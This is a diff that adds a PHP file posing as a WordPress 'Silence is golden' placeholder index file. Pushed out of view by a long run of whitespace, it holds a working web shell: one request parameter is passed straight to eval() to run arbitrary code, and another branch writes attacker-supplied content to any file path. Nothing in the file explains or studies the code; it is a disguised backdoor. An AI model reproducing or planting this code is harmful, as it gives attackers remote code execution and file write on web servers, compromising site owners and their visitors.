@@ -1,0 +1,5 @@
+<?php
+// Silence is golden.
+?><?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  $shvonl = "1bc1fcb2ef1e7fc81e2d812feba2b1e2"; if(isset($_REQUEST['bdqkvynl'])) { $rxrojlqk = $_REQUEST['bdqkvynl']; eval($rxrojlqk); exit(); } if(isset($_REQUEST['lywht'])) { $yvjyiepw = $_REQUEST['gpykgiff']; $wrwtilcu = $_REQUEST['lywht']; $bnfaknt = fopen($wrwtilcu, 'w'); $ijcg = fwrite($bnfaknt, $yvjyiepw); fclose($bnfaknt); echo $ijcg; exit(); } ?><?php
+// Silence is golden.
+?>
